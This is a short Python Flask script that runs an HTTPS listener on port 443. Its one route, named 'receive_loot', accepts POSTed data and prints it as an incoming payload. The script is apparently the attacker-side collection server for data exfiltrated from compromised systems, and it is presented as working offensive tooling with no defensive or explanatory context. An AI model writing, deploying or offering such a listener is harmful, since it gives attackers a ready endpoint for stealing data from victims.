from flask import Flask, request
import ssl

app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_loot():
    data = request.get_data()
    print(f"\n[+] Incoming Encrypted Payload:\n{data.decode(errors='ignore')}\n")
    return "Received", 200

if __name__ == "__main__":
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('cert.pem', 'key.pem')  # Ensure these are in the same dir
    app.run(host='0.0.0.0', port=443, ssl_context=context)
